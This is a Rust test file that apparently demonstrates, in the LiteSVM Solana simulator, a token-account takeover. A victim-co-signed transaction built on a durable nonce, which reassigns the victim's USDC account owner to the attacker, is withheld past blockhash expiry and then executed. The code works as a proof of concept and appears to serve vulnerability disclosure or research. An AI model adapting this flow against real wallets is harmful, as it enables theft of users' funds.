use {
    litesvm::LiteSVM,
    solana_account::{state_traits::StateMut, Account, ReadableAccount},
    solana_address::{address, Address},
    solana_instruction::Instruction,
    solana_keypair::Keypair,
    solana_message::{v1, Message, VersionedMessage},
    solana_native_token::LAMPORTS_PER_SOL,
    solana_nonce::{
        state::{Data as NonceData, State as NonceState},
        versions::Versions,
    },
    solana_program_option::COption,
    solana_program_pack::Pack,
    solana_signer::Signer,
    solana_system_interface::instruction as system_instruction,
    solana_transaction::{versioned::VersionedTransaction, Transaction},
    spl_token_interface::{
        instruction::{self as token_instruction, AuthorityType},
        state::{Account as TokenAccount, AccountState},
        ID as SPL_TOKEN_PROGRAM_ID,
    },
};

const USDC_MINT: Address = address!("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v");

#[test]
fn attacker_can_withhold_nonce_tx_then_execute_token_authority_takeover() {
    let mut svm = LiteSVM::new();

    let attacker = Keypair::new();
    let victim = Keypair::new();
    let nonce_account = Keypair::new();
    let victim_usdc_account = Address::new_unique();

    svm.airdrop(&attacker.pubkey(), 10 * LAMPORTS_PER_SOL)
        .unwrap();
    svm.airdrop(&victim.pubkey(), 10 * LAMPORTS_PER_SOL)
        .unwrap();

    let nonce_rent = svm.minimum_balance_for_rent_exemption(NonceState::size());
    let create_nonce_ixs = system_instruction::create_nonce_account(
        &attacker.pubkey(),
        &nonce_account.pubkey(),
        &attacker.pubkey(),
        nonce_rent,
    );
    let create_nonce_tx = Transaction::new(
        &[&attacker, &nonce_account],
        Message::new_with_blockhash(
            &create_nonce_ixs,
            Some(&attacker.pubkey()),
            &svm.latest_blockhash(),
        ),
        svm.latest_blockhash(),
    );
    svm.send_transaction(create_nonce_tx).unwrap();

    seed_victim_usdc_token_account(&mut svm, victim_usdc_account, victim.pubkey());

    let nonce = nonce_data_from_account(
        &svm.get_account(&nonce_account.pubkey())
            .expect("nonce account should exist"),
    )
    .blockhash();

    let attack_message = v1::Message::try_compile(
        &attacker.pubkey(),
        &[
            system_instruction::advance_nonce_account(&nonce_account.pubkey(), &attacker.pubkey()),
            set_usdc_account_owner_authority(
                &victim_usdc_account,
                &victim.pubkey(),
                &attacker.pubkey(),
            ),
        ],
        nonce,
    )
    .unwrap();
    let attack_tx = sign_attack_tx_in_two_steps(attack_message, &victim, &attacker);

    // The attacker withholds the fully signed transaction until ordinary recent
    // blockhashes would have expired. The durable nonce still lets it execute.
    svm.warp_to_slot(500_000);
    svm.expire_blockhash();

    // Once v1 lands on mainnet, this withheld transaction is now valid.
    svm.send_transaction(attack_tx).unwrap();

    let victim_token_account = svm.get_account(&victim_usdc_account).unwrap();
    assert_eq!(
        unpack_spl_token_account_owner(&victim_token_account.data),
        attacker.pubkey()
    );
}

fn sign_attack_tx_in_two_steps(
    attack_message: v1::Message,
    victim: &Keypair,
    attacker: &Keypair,
) -> VersionedTransaction {
    let message = VersionedMessage::V1(attack_message);
    let signature_count = usize::from(message.header().num_required_signatures);
    assert_eq!(
        &message.static_account_keys()[..signature_count],
        &[attacker.pubkey(), victim.pubkey()]
    );

    let mut attack_tx = VersionedTransaction {
        signatures: vec![Default::default(); signature_count],
        message,
    };

    add_signature(&mut attack_tx, victim);
    add_signature(&mut attack_tx, attacker);
    attack_tx
}

fn add_signature(tx: &mut VersionedTransaction, signer: &Keypair) {
    let signer_key = signer.pubkey();
    let required_signers = &tx.message.static_account_keys()
        [..usize::from(tx.message.header().num_required_signatures)];
    let signature_index = required_signers
        .iter()
        .position(|key| key == &signer_key)
        .expect("signer must be required by message");

    tx.signatures[signature_index] = signer.sign_message(&tx.message.serialize());
}

fn seed_victim_usdc_token_account(svm: &mut LiteSVM, token_account: Address, owner: Address) {
    let token_account_state = TokenAccount {
        mint: USDC_MINT,
        owner,
        amount: 1_000_000_000,
        delegate: COption::None,
        state: AccountState::Initialized,
        is_native: COption::None,
        delegated_amount: 0,
        close_authority: COption::None,
    };
    let mut data = vec![0; TokenAccount::LEN];
    TokenAccount::pack(token_account_state, &mut data).unwrap();

    svm.set_account(
        token_account,
        Account {
            lamports: svm.minimum_balance_for_rent_exemption(TokenAccount::LEN),
            data,
            owner: SPL_TOKEN_PROGRAM_ID,
            executable: false,
            rent_epoch: 0,
        },
    )
    .unwrap();
}

fn set_usdc_account_owner_authority(
    token_account: &Address,
    current_owner: &Address,
    new_owner: &Address,
) -> Instruction {
    token_instruction::set_authority(
        &SPL_TOKEN_PROGRAM_ID,
        token_account,
        Some(new_owner),
        AuthorityType::AccountOwner,
        current_owner,
        &[],
    )
    .unwrap()
}

fn nonce_data_from_account<T: ReadableAccount + StateMut<Versions>>(account: &T) -> NonceData {
    match StateMut::<Versions>::state(account).unwrap().state() {
        NonceState::Initialized(data) => data.clone(),
        NonceState::Uninitialized => panic!("nonce account should be initialized"),
    }
}

fn unpack_spl_token_account_owner(data: &[u8]) -> Address {
    TokenAccount::unpack(data).unwrap().owner
}
